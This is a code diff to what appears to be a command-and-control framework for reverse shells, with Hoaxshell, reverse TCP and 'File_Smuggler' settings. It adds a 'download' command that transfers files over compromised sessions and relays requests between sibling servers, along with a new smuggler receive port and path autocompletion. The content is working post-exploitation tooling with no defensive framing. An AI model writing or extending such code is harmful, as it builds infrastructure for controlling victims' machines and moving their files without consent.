@@ -47,9 +47,10 @@ if Hoaxshell_Settings.ssl_support:
 Core_Server_Settings.bind_port = args.port if args.port else Core_Server_Settings.bind_port
 TCP_Sock_Handler_Settings.bind_port = args.reverse_tcp_port if args.reverse_tcp_port else TCP_Sock_Handler_Settings.bind_port
 File_Smuggler_Settings.bind_port = args.file_smuggler_port if args.file_smuggler_port else File_Smuggler_Settings.bind_port
+File_Smuggler_Settings.receive_port = args.file_smuggler_port if args.file_smuggler_port else File_Smuggler_Settings.receive_port
 
 # Check if there are port number conflicts
-defined_ports = [Core_Server_Settings.bind_port, TCP_Sock_Handler_Settings.bind_port, File_Smuggler_Settings.bind_port]
+defined_ports = [Core_Server_Settings.bind_port, TCP_Sock_Handler_Settings.bind_port, File_Smuggler_Settings.bind_port, File_Smuggler_Settings.receive_port]
 
 if Hoaxshell_Settings.ssl_support:
 	defined_ports.append(Hoaxshell_Settings.bind_port_ssl)
@@ -166,7 +167,7 @@ class Completer(object):
 		self.main_prompt_commands = clone_dict_keys(PrompHelp.commands)
 		self.main_command_arguments = ['payload', 'lhost', 'obfuscate', 'encode', 'constraint_mode', \
 		'exec_outfile', 'domain']
-		self.pseudo_shell_commands = ['upload', 'cmdinspector', 'inject']
+		self.pseudo_shell_commands = ['upload', 'download', 'cmdinspector', 'inject']
 		self.payload_templates_root = os.path.dirname(os.path.abspath(__file__)) + f'{os.sep}Core{os.sep}payload_templates'
 	
 	
@@ -409,7 +410,7 @@ class Completer(object):
 		
 		# Autocomplete paths
 		
-		elif (main_cmd in ['inject', 'upload']) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] in [os.sep, "~"]):
+		elif (main_cmd in ['inject', 'upload','download']) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] in [os.sep, "~"]):
 			
 			root = os.sep if (line_buffer_list[-1][0] == os.sep) else os.path.expanduser('~')
 			search_term = line_buffer_list[-1] if (line_buffer_list[-1][0] != '~') else line_buffer_list[-1].replace('~', os.sep)
@@ -1012,6 +1013,46 @@ def main():
 
 					print_columns(thread_names)
 
+				elif cmd == 'download':
+				
+					Main_prompt.ready = False
+					file_url = cmd_list[1]
+					dest_path = os.path.expanduser(cmd_list[2])
+					session_id = sessions_manager.alias_to_session_id(cmd_list[3])
+				
+					if not session_id:
+						print('Failed to interpret session_id.')
+						Main_prompt.ready = True
+						continue
+				
+					sessions_check = Sessions_Manager.sessions_check(session_id)
+				
+					if sessions_check[0]:
+				
+						# Check if any sibling server has an active pseudo shell on that session
+						shell_occupied = core.is_shell_session_occupied(session_id)
+				
+						if not shell_occupied:
+							# Check who is the owner of the shell session
+							session_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')
+				
+							if session_owner_id == core.return_server_uniq_id():
+								File_Smuggler.download_file(file_url, dest_path, session_id)
+							else:
+								core.send_receive_one_encrypted(session_owner_id, [file_url, dest_path, session_id], 'download_file')
+				
+						else:
+							print(f'\r[{INFO}] The session is currently being used by a sibling server.')
+							Main_prompt.ready = True
+							continue
+				
+						# Reset prompt if session status is Undefined or Lost
+						if Sessions_Manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:
+							Main_prompt.ready = True
+				
+					else:
+						print(sessions_check[1])
+						Main_prompt.ready = True
 
 				elif cmd == 'upload':
 
